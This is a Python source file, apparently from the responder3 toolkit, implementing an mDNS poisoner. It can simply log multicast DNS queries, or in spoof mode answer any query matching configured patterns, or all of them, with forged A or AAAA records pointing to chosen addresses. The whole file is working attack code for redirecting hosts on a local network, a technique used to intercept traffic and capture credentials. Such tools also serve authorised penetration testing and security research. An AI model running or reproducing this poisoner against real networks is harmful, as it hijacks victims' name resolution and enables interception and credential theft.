import socket
import struct
import logging
import asyncio
import ipaddress
import traceback

from responder3.core.commons import *
from responder3.core.udpwrapper import UDPClient
from responder3.core.servertemplate import ResponderServer, ResponderServerSession
from responder3.protocols.DNS import *


class MDNSSession(ResponderServerSession):
	pass

class MDNS(ResponderServer):
	def custom_socket(server_properties):
		if server_properties.bind_addr.version == 4:
			mcast_addr = ipaddress.ip_address('224.0.0.251')
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
			sock.setblocking(False)#SUPER IMPORTANT TO SET THIS FOR ASYNCIO!!!!
			sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
			sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
			sock.bind(('0.0.0.0', server_properties.bind_port))
			mreq = struct.pack("=4sl", mcast_addr.packed, socket.INADDR_ANY)
			sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
			
		else:
			ip = ipaddress.ip_address('FF02::FB')
			interface_index = socket.if_nametoindex(server_properties.bind_iface)
			sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
			sock.setblocking(False)#SUPER IMPORTANT TO SET THIS FOR ASYNCIO!!!!
			sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
			sock.bind(('::', server_properties.bind_port, 0, interface_index))
			sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP,
				struct.pack('16sI', ip.packed, interface_index))
			
		return sock

	def init(self):
		self.maddr = ('224.0.0.251' , 5353)
		if self.sprops.bind_addr.version == 6:
			interface_index = socket.if_nametoindex(self.sprops.bind_iface)
			self.maddr = ('FF02::FB' , 5353,0, interface_index)
		
		self.parser = DNSPacket
		self.spoofTable = []
		if self.settings is None:
			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
			self.settings = {}
			self.settings['mode'] = PoisonerMode.ANALYSE

		else:
			#parse the poisoner mode
			if isinstance(self.settings['mode'], str):
				self.settings['mode'] = PoisonerMode[self.settings['mode'].upper()]

			#compiling re strings to actual re objects and converting IP strings to IP objects
			if self.settings['mode'] == PoisonerMode.SPOOF:
				for exp in self.settings['spooftable']:
					if exp == 'ALL':
						self.spoofTable.append((re.compile('.*'),ipaddress.ip_address(self.settings['spooftable'][exp])))
						continue
					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spooftable'][exp])))

	@asyncio.coroutine
	def parse_message(self):
		msg = yield from asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
		return msg

	@asyncio.coroutine
	def send_data(self, data, addr):
		#we need to set the addr here, because we are sending the packet to the multicast address, not to the clinet itself
		#however there could be cases that the client accepts unicast, but it's ignored for now
		yield from asyncio.wait_for(self.cwriter.write(data, addr), timeout=1)
		return
	
	@asyncio.coroutine
	def run(self):
		try:
			msg = yield from asyncio.wait_for(self.parse_message(), timeout=1)
			if msg.QR == DNSResponse.REQUEST:
				if self.settings['mode'] == PoisonerMode.ANALYSE:
					for q in msg.Questions:
						self.logPoisonResult(requestName = q.QNAME.name)

				else:
					answers = []
					for targetRE, ip in self.spoofTable:
						for q in msg.Questions:
							if targetRE.match(q.QNAME.name):
								self.logPoisonResult(requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
								#BE AWARE THIS IS NOT CHECKING IF THE QUESTION AS FOR IPV4 OR IPV6!!!
								if ip.version == 4:
									res = DNSAResource.construct(q.QNAME.name, ip)
								elif ip.version == 6:
									res = DNSAAAAResource.construct(q.QNAME.name, ip)
								else:
									raise Exception('This IP version scares me...')
								#res.construct(q.QNAME, NBRType.NB, ip)
								answers.append(res)
					
					response = DNSPacket.construct(TID = msg.TransactionID, 
													 response    = DNSResponse.RESPONSE, 
													 additionals = answers,
													 questions   = msg.Questions)

					yield from asyncio.wait_for(self.send_data(response.toBytes(), self.maddr), timeout=1)

		except Exception as e:
			traceback.print_exc()
			self.log('Exception! %s' % (str(e),))
			pass